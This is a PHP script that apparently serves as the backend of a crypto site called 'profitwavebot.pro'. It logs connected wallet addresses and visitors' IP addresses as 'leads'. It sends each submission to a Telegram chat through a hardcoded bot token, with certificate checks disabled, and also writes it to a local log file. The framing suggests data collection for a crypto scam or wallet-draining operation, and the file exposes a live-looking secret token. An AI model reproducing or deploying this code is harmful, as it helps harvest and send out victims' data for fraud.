<?php


header('Content-Type: application/json');

$action = $_POST['action'] ?? '';
$data   = $_POST['data']   ?? '';
$ip     = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$host   = $_SERVER['HTTP_HOST'] ?? 'profitwavebot.pro';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

if (!empty($data)) {

    $message = "🚨 <b>New Lead - mbot</b>\n\n";
    $message .= "Action: <b>" . htmlspecialchars($action) . "</b>\n";
    $message .= "Address: <code>" . htmlspecialchars($data) . "</code>\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "Host: " . $host . "\n";


    if ($action === 'wallet_connect') {
        $message .= "\n🔥 Wallet connected!";
    } elseif ($action === 'contract_deploy') {
        $message .= "\n📄 Contract deployed!";
    }


    $botToken = '8790701323:AAFQdlh18Ioz_hvalZEdGhW9_8vFfZYYYy0';
    $chatID   = '-1003740264705';

    $telegramUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

    $postFields = [
        'chat_id'    => $chatID,
        'text'       => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);


    $log = date('Y-m-d H:i:s') . " | " . $ip . " | " . $action . " | " . $data . "\n";
    file_put_contents('leads.log', $log, FILE_APPEND);
}


echo json_encode(['status' => 'success']);
?>
